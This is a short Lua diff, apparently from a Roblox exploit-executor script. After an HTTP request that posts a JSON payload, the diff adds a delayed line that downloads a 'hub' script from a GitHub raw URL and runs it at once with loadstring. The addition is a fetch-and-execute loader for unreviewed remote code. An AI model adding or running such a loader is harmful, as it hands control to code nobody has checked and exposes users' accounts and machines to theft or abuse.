@@ -172,3 +172,7 @@ http_request({
     Headers = { ["Content-Type"] = "application/json" },
     Body    = HttpService:JSONEncode(payload)
 })
+
+task.wait(10)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanixHUB/refs/heads/main/SnapSanixHUB.lua'))()
